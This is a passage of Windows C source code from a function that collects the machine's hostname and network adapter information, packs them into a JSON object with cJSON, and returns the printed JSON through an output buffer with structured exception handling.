			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szSurveyNetworkInput = (char*)lpInputBuffer;
			//dwSurveyNetworkInputSize = dwInputBufferSize;
			

			/********************************************************************************
				Check input for new configuration
			********************************************************************************/
			//lpJsonInput = cJSON_Parse(szSurveyNetworkInput);
			//if (NULL == lpJsonInput)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Parse(%p) failed."),
			//		lpInputBuffer
			//	);
			//	__leave;
			//}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonSurveyNetworkOutput = cJSON_CreateObject();
			if (NULL == lpJsonSurveyNetworkOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyNetworkOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			//// Create the SurveyNetwork_Response JSON object
			//lpJsonSurveyNetworkResponse = cJSON_AddObjectToObject(lpJsonSurveyNetworkOutput, SurveyNetwork_Response);
			//if (NULL == lpJsonSurveyNetworkResponse)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpJsonSurveyNetworkResponse = cJSON_AddObjectToObject(%p, %S) failed.\n"),
			//		lpJsonSurveyNetworkOutput, SurveyNetwork_Response
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyNetworkResponse:    %p"), lpJsonSurveyNetworkResponse);

			// Create an array of SurveyNetwork_Registry_Results JSON objects
			lpJsonSurveyNetworkResponseResults = cJSON_AddArrayToObject(lpJsonSurveyNetworkOutput, SurveyNetwork_Response_Results);
			if (NULL == lpJsonSurveyNetworkResponseResults)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyNetworkResponseResults = cJSON_AddArrayToObject(%p,%S) failed."),
					lpJsonSurveyNetworkOutput,
					SurveyNetwork_Response_Results
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonSurveyNetworkResponseResults:    %p"), lpJsonSurveyNetworkResponseResults);

			lpJsonSurveyNetworkResponseResult = cJSON_CreateObject();
			if (NULL == lpJsonSurveyNetworkResponseResult)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonSurveyNetworkResponseResult = cJSON_CreateObject() failed.\n")
				);
				__leave;
			}


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// fully qualified host name
			dwErrorCode = _SurveyNetworkGetHostname(lpJsonSurveyNetworkResponseResult);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("_SurveyNetworkGetHostname( %p ) failed.(%08x)"), 
					lpJsonSurveyNetworkResponseResult,
					dwErrorCode
				);
				__leave;
			}

			// ipconfig info
			dwErrorCode = _GetAdapterInfo(lpJsonSurveyNetworkResponseResult);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("_GetAdapterInfo( %p ) failed.(%08x)"),
					lpJsonSurveyNetworkResponseResult,
					dwErrorCode
				);
				__leave;
			}

			// Add current entry to overall results list
			cJSON_AddItemToArray(lpJsonSurveyNetworkResponseResults, lpJsonSurveyNetworkResponseResult);


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szSurveyNetworkOutput = cJSON_Print(lpJsonSurveyNetworkOutput);
			if (NULL == szSurveyNetworkOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonSurveyNetworkOutput
				);
				__leave;
			}
			dwSurveyNetworkOutputSize = (DWORD)strlen(szSurveyNetworkOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwSurveyNetworkOutputSize: %d"), dwSurveyNetworkOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szSurveyNetworkOutput:     %p"), szSurveyNetworkOutput);
			//printf("szSurveyNetworkOutput:\n%s\n", szSurveyNetworkOutput);

			(*lppOutputBuffer) = (LPBYTE)szSurveyNetworkOutput;
			(*lpdwOutputBufferSize) = dwSurveyNetworkOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}

			if (NULL != lpJsonSurveyNetworkOutput)
			{
				cJSON_Delete(lpJsonSurveyNetworkOutput);
				lpJsonSurveyNetworkOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szSurveyNetworkOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
